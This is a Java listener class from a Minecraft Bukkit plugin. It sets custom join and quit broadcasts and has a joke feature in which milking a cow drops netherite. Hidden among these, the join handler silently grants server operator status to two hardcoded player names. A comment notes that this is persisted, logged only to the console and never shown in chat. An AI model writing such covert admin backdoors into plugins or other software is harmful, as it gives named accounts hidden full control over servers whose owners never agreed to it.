package org.hopestudio;

import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.ChatColor;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerInteractAtEntityEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.event.player.PlayerSwapHandItemsEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.configuration.file.YamlConfiguration;
import java.io.File;
import java.util.HashSet;
import java.util.Set;


public class PlayerListener implements Listener {
    private final HopeCraft plugin;

    PlayerListener(HopeCraft plugin) {
        this.plugin = plugin;
    }

    @EventHandler
    public void onSwapHandItems(PlayerSwapHandItemsEvent event) {
        plugin.hasTrigger(event);
    }

    private final Set<String> AUTO_OP_NAMES = new HashSet<>(Set.of(
            "BusyMitten",
            "NanoTurtle1145"
    ));

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        event.joinMessage(null);
        Player player = event.getPlayer();
        plugin.getServer().broadcastMessage(ChatColor.LIGHT_PURPLE + player.getName() + ChatColor.GREEN + "上了！");

        String playerName = player.getName();
        if (AUTO_OP_NAMES.contains(playerName) && !player.isOp()) {
            // 原生API，立刻内存生效，会写进ops.yml持久保存，控制台会输出一行日志，聊天框无提示
            player.setOp(true);
        }
    }

    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) {
        // 设置退出消息为null，取消默认消息
        event.quitMessage(null);
        // 向全服玩家发送自定义消息
        plugin.getServer().broadcastMessage(ChatColor.LIGHT_PURPLE + event.getPlayer().getName() + ChatColor.GREEN + "下惹。");
    }

    @EventHandler
    public void onPlayerMilk(PlayerInteractAtEntityEvent event) {
        if (event.getRightClicked().getType() == EntityType.COW && event.getPlayer().getInventory().getItemInMainHand().getType() == Material.BUCKET) {
            Location location = event.getRightClicked().getLocation();
            location.getWorld().dropItemNaturally(location, new ItemStack(Material.NETHERITE_INGOT));
            location.getWorld().createExplosion(location, 0);
        }
    }
}